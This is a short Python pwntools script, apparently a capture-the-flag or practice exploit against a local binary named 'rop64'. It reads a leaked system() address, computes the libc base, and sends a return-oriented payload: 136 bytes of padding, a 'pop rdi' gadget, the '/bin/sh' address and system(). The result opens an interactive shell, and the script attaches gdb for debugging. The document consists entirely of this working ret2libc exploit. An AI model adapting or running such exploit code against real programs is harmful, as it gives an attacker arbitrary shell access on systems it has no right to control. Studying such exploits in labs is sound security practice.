from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

# gadgets
# 0x0000000000028a55 : pop rdi ; ret
# 0x0000000000028db2 : pop rdi ; pop rbp ; ret

libc = ELF("/lib/x86_64-linux-gnu/libc-2.33.so")

p = process("./rop64")
system_addr = int(p.recvline(keepends=False), 16)
base_addr = system_addr - libc.symbols["system"]
# use two pop to align the stack
gadget_addr = 0x0000000000028db2 + base_addr
sh_addr = next(libc.search(b"/bin/sh")) + base_addr

payload = b"".join([
    b"A" * 136,
    p64(gadget_addr),
    p64(sh_addr),
    b"B" * 8,
    p64(system_addr),
])

gdb.attach(p, """
    b vuln_func
""")

p.send(payload)
p.interactive()
